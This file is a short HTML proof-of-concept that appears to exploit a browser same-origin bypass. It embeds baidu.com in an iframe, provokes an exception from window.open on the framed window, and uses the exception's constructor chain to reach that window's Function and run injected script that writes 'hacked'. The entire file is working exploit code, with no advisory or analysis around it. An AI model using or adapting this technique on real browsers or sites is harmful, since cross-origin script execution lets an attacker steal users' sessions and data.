<html>
<head>
<link rel="icon" href="data:;base64,iVBORw0KGgo=">
<meta name="viewport" content="width=device-width, user-scalable=no, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<script>
function getPropertyDescriptor(object, property) {
    var ownObjectProto = object;
    // exit if bad property
    if (!object[property]) {
        console.error(property + " is not a property of " + object.toString());
        return;
    }

    while (!Object.getOwnPropertyDescriptor(ownObjectProto, property)) {
        ownObjectProto = Object.getPrototypeOf(ownObjectProto);
        if (!ownObjectProto)
            return;
    }

    var ownProperty = Object.getOwnPropertyDescriptor(ownObjectProto, property);
    return ownProperty;
}

function doOnload() {
    var frame = document.querySelector("iframe");
    var victimWindow = frame.contentWindow;
    try {
        window.open.call(victimWindow);
    } catch (ex) {
        console.log(ex.stack)
        fun = ex.constructor.constructor; //this is actually victimWindow.Function
        fun("(function(){var location=window.location.toString();var info = location.indexOf('baidu') != -1 ? 'hacked' : 'not hacked';document.write(info);})();")();
    }
}
</script>
<style>
iframe {
    width: 100%;
    height: 100%;
}
</style>
</head>
<body>
yoyoyo
<iframe src="http://baidu.com" onload="doOnload()" sandbox="allow-scripts allow-same-origin">
</iframe>
</body>
</html>
